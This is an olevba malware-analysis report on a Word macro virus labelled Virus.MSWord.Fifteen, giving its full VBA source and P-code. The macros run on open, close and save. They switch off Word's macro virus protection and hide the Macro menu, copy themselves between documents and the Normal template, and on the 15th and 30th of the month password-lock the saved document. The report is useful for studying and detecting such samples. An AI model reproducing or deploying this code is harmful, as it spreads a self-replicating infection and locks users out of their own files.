olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fifteen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fifteen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XvX.bas 
in file: Virus.MSWord.Fifteen - OLE stream: 'Macros/VBA/XvX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub AutoOpen()
 On Error Resume Next
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
   CommandBars("Tools").Controls("Macro").Visible = False
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:="XvX" _
       , Object:=wdOrganizerObjectProjectItems
End Sub

Public Sub HelpAbout()
On Error Resume Next
ans = MsgBox("   VIRUS INFECTED", vbOKOnly, ">>>>>> XVX <<<<<<")
End Sub


Public Sub AutoClose()
On Error Resume Next
   Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems
End Sub

Public Sub FileSave()
On Error Resume Next

Xdate = Date
XDay = Mid(Xdate, 3, 2)
If XDay = "15" Or XDay = "30" Then
ThisDocument.Password = ">>xvx<<"
End If

Dialogs(wdDialogFileSaveAs).Show

 Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub


Public Sub FileSaveAs()
On Error Resume Next

Xdate = Date
XDay = Mid(Xdate, 3, 2)
If XDay = "15" Or XDay = "30" Then
ThisDocument.Password = ">>xvx<<"
End If

Dialogs(wdDialogFileSaveAs).Show

 Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub

Public Sub AutoExec()
On Error Resume Next
   Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Fifteen
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/XvX - 4771 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub AutoOpen())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #5:
' 	LineCont 0x0008 0B 00 08 00 12 00 07 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "XvX"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Public Sub HelpAbout())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitStr 0x0011 "   VIRUS INFECTED"
' 	Ld vbOKOnly 
' 	LitStr 0x0011 ">>>>>> XVX <<<<<<"
' 	ArgsLd MsgBox 0x0003 
' 	St ans 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Public Sub AutoClose())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	LineCont 0x0008 05 00 08 00 0B 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "XvX"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Public Sub FileSave())
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' Line #22:
' 	Ld Date 
' 	St Xdate 
' Line #23:
' 	Ld Xdate 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St XDay 
' Line #24:
' 	Ld XDay 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	Ld XDay 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0007 ">>xvx<<"
' 	Ld ThisDocument 
' 	MemSt Password 
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #29:
' Line #30:
' 	LineCont 0x0008 05 00 08 00 0B 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "XvX"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' Line #35:
' 	FuncDefn (Public Sub FileSaveAs())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' Line #38:
' 	Ld Date 
' 	St Xdate 
' Line #39:
' 	Ld Xdate 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St XDay 
' Line #40:
' 	Ld XDay 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	Ld XDay 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0007 ">>xvx<<"
' 	Ld ThisDocument 
' 	MemSt Password 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #45:
' Line #46:
' 	LineCont 0x0008 05 00 08 00 0B 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "XvX"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Public Sub AutoExec())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	LineCont 0x0008 05 00 08 00 0B 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "XvX"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #53:
' Line #54:
' 	EndSub 
' Line #55:
' Line #56:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

